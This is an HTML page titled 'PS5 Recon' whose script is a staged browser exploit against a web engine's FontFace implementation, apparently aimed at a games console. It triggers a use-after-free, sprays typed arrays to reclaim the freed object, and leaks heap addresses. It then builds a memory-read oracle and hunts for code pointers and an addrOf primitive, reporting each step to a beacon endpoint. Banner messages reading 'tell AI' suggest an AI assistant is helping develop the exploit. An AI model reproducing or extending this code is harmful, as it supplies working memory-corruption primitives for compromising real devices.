<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>PS5 Recon</title>
<style>
:root{--bg:#070a0f;--panel:#111722;--line:#1e2838;--txt:#cfe0f2;--dim:#6b7c94;--green:#39d98a;--red:#ff5d6c;--amber:#ffcf6b;--cyan:#53d0e8;--mag:#ff6fd0}
*{margin:0;padding:0;box-sizing:border-box}
html,body{background:var(--bg);color:var(--txt);font:13px/1.5 ui-monospace,Menlo,Consolas,monospace}
#bn{position:fixed;top:0;left:0;right:0;z-index:99;font:800 16px/1.3 ui-monospace,monospace;padding:14px 12px;text-align:center;color:#fff;background:#1b2330;border-bottom:3px solid #2a3647}
#sub{position:fixed;top:64px;left:0;right:0;z-index:98;font:600 11px ui-monospace,monospace;padding:6px 12px;text-align:center;color:var(--dim);background:#0d131c;border-bottom:1px solid var(--line)}
#log{margin:96px 10px 10px;padding:10px;background:var(--panel);border:1px solid var(--line);border-radius:8px;max-height:76vh;overflow:auto}
.r{padding:2px 5px;white-space:pre-wrap;word-break:break-all;border-left:3px solid transparent}
.r .t{color:var(--cyan);font-weight:700}.r .n{color:var(--dim);font-weight:700}
.r.ok{border-left-color:var(--green);background:#0c1f16}.r.ok .t{color:var(--green)}
.r.bad{border-left-color:var(--red);background:#1c0f12}.r.bad .t{color:var(--red)}
.r.warn .t{color:var(--amber)}
.r.win{border-left-color:var(--mag);background:#1e0f1b}.r.win .t{color:var(--mag);font-weight:800}
</style></head>
<body>
<div id="bn">starting…</div>
<div id="sub">P1318 — re-add lf1 → m_ranges oracle (OOM-safe) ; then unicodeRange setter (NO readback)</div>
<div id="log"></div>
<script>
'use strict';
window.PTAG='P1318';
var LOG=document.getElementById('log'),BN=document.getElementById('bn');
var _ctr=0;
function S(x,c){BN.textContent=x;BN.style.background=c||'#1b2330';}
function cls(s){var z=(''+s).toLowerCase();
  if(/win|oracle-ok|code-ptr|addrof|set-done.*0x/.test(z))return 'win';
  if(/hit|ok\b|dangling-ok/.test(z))return 'ok';
  if(/err|fail|crash|fatal|miss|nospray|cap|not-dangle|no-match/.test(z))return 'bad';
  if(/stale|none|retry/.test(z))return 'warn';return '';}
function row(t,d,c){_ctr++;var r=document.createElement('div');r.className='r '+(c||'');
  r.innerHTML="<span class='n'>"+_ctr+"</span>  <span class='t'>"+String(t).replace(/[<>&]/g,'')+"</span>"+(d?"  <span>"+String(d).replace(/[<>&]/g,'')+"</span>":"");
  LOG.appendChild(r);while(LOG.childNodes.length>48)LOG.removeChild(LOG.firstChild);LOG.scrollTop=LOG.scrollHeight;}
function B(tag,data){
  var c=cls(tag+' '+(data||''));row(tag,data,c);
  try{var s=String(data||'').replace(/[^A-Za-z0-9._-]/g,'_').slice(0,700);
    var u='/beacon.php?tag=P1318-'+encodeURIComponent(tag);
    if(data)u+='&data='+encodeURIComponent(s);
    u+='&t='+Date.now();
    var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);}catch(e){}
}
window.onerror=function(m,s,l){B('ERR',(''+m).slice(0,80)+'@'+l);};

(function(){var id='';var cs='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';for(var i=0;i<6;i++)id+=cs[Math.floor(Math.random()*cs.length)];B('VER-1','');B('BOOT',id);})();

function le(u,o){var x=0n;for(var q=7;q>=0;q--)x=(x<<8n)|BigInt(u[o+q]);return x;}
function wq(buf,off,v){for(var i=0;i<8;i++){buf[off+i]=Number(v&0xFFn);v>>=8n;}}
function wd(buf,off,v){for(var i=0;i<4;i++){buf[off+i]=(v>>>(8*i))&0xFF;}}

var leaked={L1:null,L2:null,buf:null,W:null};
window.__lf=null;

var RC=0;try{RC=parseInt(sessionStorage.getItem('p1318_rc')||'0',10)||0;}catch(e){}
function reloadOnce(why){
  if(leaked.ok)return;
  if(RC>=4){B('CAP',why+' — CLOSE+REOPEN');S('capped — close+reopen the browser','#4a2a12');return;}
  try{sessionStorage.setItem('p1318_rc',String(RC+1));}catch(e){}
  setTimeout(function(){location.reload();},400);
}

/* ═══ STAGE 1 — proven leak + REQUIRE dangling lf1 ═══ */
var K=32,SIZE=192,fired=false;
S('STAGE 1 — proven leak…','#13233a');
window.__sp=[];
var fs=null;
try{
  var vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});
  document.fonts.add(vf); void vf.loaded;
  fs=document.createElement('style');
  fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
  document.head.appendChild(fs);
}catch(e){B('S1-SETUP-ERR',(''+e).slice(0,50));}
Object.defineProperty(FontFace.prototype,'then',{configurable:true,
  get:function(){
    if(fired)return undefined;fired=true;
    try{if(fs){fs.textContent='';fs.remove();}}catch(e){}
    try{document.fonts.delete(this);}catch(e){}
    fs=null;try{document.body.offsetHeight;}catch(e){}
    for(var k=0;k<K;k++){var w=new Uint8Array(new ArrayBuffer(SIZE));w[0x82]=3;w[0]=0;w[1]=0;w[2]=0;w[3]=0x80;var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;w[6]=0;w[7]=0;window.__sp.push(w);}
    return undefined;
  },set:function(){}});
B('S1-SETUP','armed');
try{document.fonts.load('1em vf, v1','AB').then(function(faces){window.__lf=faces;B('S1-RES','n'+(faces&&faces.length));setTimeout(leScan,80);},function(e){B('S1-RJ',''+(e&&e.name));setTimeout(leScan,80);});}catch(e){B('S1-LOADERR',(''+e).slice(0,40));}
setTimeout(function(){ if(leaked.ok)return; if(!window.__sp||!window.__sp.length){B('S1-NOSPRAY','');reloadOnce('nospray');} },1500);
setTimeout(function(){ if(!leaked.buf){leScan();} },700);

function leScan(){
  if(leaked.buf)return;
  var sp=window.__sp||[],hit=-1;
  for(var i=0;i<sp.length;i++){var a=le(sp[i],0x58);if(a>0x1000000000n&&a<0x8000000000n){leaked.L1=a;leaked.L2=le(sp[i],0x68);leaked.buf=sp[i];hit=i;break;}}
  if(hit<0){B('S1-MISS','');reloadOnce('miss');return;}
  B('S1-HIT','L1=0x'+leaked.L1.toString(16)+' L2=0x'+leaked.L2.toString(16));
  var W=null,which='';var cands=[];if(window.__lf)for(var i=0;i<window.__lf.length;i++)cands.push(['lf'+i,window.__lf[i]]);
  leaked.buf[0x82]=4;for(var i=0;i<cands.length;i++){var st='';try{st=''+cands[i][1].status;}catch(e){st='E';}if(st==='error'){W=cands[i][1];which=cands[i][0];break;}}
  leaked.buf[0x82]=3;
  if(!W){B('NOT-DANGLE','');reloadOnce('notdangle');return;}
  leaked.W=W;leaked.ok=true;B('DANGLING-OK',which);
  S('DANGLING '+which+' — oracle test…','#0c7a3a');
  setTimeout(stage2,120);
}

/* ═══ STAGE 2 — OOM-SAFE oracle via re-added lf1 (direct buffer writes only) ═══ */
function chk(fam,cp){try{return document.fonts.check('16px '+fam,String.fromCodePoint(cp))?'T':'F';}catch(e){return 'E';}}
function stage2(){
  if(window.__s2)return;window.__s2=true;
  var buf=leaked.buf,W=leaked.W;
  /* re-register the dangling wrapper so check() can route to it */
  try{document.fonts.add(W);B('READD','ok');}catch(e){B('READD-ERR',(''+e).slice(0,40));}
  buf[0x82]=1; /* Loading so a matched face flips check to false */
  var fams=['v1','vf'],matched=null;
  for(var fi=0;fi<fams.length;fi++){
    var fam=fams[fi];
    wd(buf,0x20,0);wd(buf,0x24,0);wd(buf,0x28,0);wd(buf,0x2C,0); /* empty ranges */
    var rA=chk(fam,0x41);
    wq(buf,0x20,leaked.L1);wd(buf,0x28,0x80000001);wd(buf,0x2C,1); /* one high-addr range (no cp covered) */
    var rB=chk(fam,0x41);
    B('ORA-'+fam,'empty='+rA+' high='+rB);
    if(rA==='F'&&rB==='T'){B('ORACLE-OK','fam='+fam+' — re-added lf1 is matchable AND m_ranges honored: READ primitive!');S('ORACLE WORKS !!! tell AI','#0a7a2a');matched=fam;}
  }
  if(matched){
    /* read a couple of SMALL dwords near L1 to show real memory reads (<=0x10FFFF resolvable) */
    var probes=[['L1+8',leaked.L1+8n],['L1+0xc',leaked.L1+0xcn]];
    for(var pi=0;pi<probes.length;pi++){
      wq(buf,0x20,probes[pi][1]);wd(buf,0x28,0x80000001);wd(buf,0x2C,1);
      var pat='';var cps=[0x1,0x10,0x100,0x1000,0x8000,0x40000];
      for(var ci=0;ci<cps.length;ci++)pat+=chk(matched,cps[ci]);
      B('ORA-RD-'+probes[pi][0],pat);
    }
  }else{B('ORA-NO-MATCH','re-added lf1 still not matched by check()');}
  setTimeout(stage3,120);
}

/* ═══ STAGE 3 — unicodeRange setter, NO readback getter; read result from our Uint8Array ═══ */
function stage3(){
  var buf=leaked.buf,W=leaked.W;
  for(var i=0x58;i<0x68;i++)buf[i]=0; /* neutralize m_clients so notify can't crash */
  B('PRE-SET','0x20=0x'+le(buf,0x20).toString(16));
  var crashed=true;
  try{ W.unicodeRange='U+1234-5678'; crashed=false; }catch(e){ B('SET-ERR',(''+(e&&e.message||e)).slice(0,60)); crashed=false; }
  if(!crashed) B('SET-DONE','0x18=0x'+le(buf,0x18).toString(16)+' 0x20=0x'+le(buf,0x20).toString(16)+' 0x28=0x'+le(buf,0x28).toString(16));
  /* classify the post-set pointers (direct buffer read, NO getter) */
  var offs=[0x18,0x20];
  for(var oi=0;oi<offs.length;oi++){var v=le(buf,offs[oi]);
    if(v!==0n){var klass=(v>=0x1000000000n&&v<0x9000000000n)?'heap':(v<0x100000n?'small':'CODE?');
      B('PTR-0x'+offs[oi].toString(16),'0x'+v.toString(16)+' ['+klass+']');
      if(klass==='CODE?'){B('CODE-PTR','WIN @0x'+offs[oi].toString(16)+' = 0x'+v.toString(16));S('CODE POINTER !!! tell AI','#0a7a2a');}
      if(klass==='heap'&&offs[oi]===0x20){B('ADDROF','engine wrote a controlled array ptr to 0x20 = 0x'+v.toString(16)+' — addrOf foothold!');}
    }}
  finish();
}
function finish(){if(window.__fin)return;window.__fin=true;B('DONE','p1318');S('P1318 COMPLETE — press the run button','#1b2330');}
</script>
</body></html>
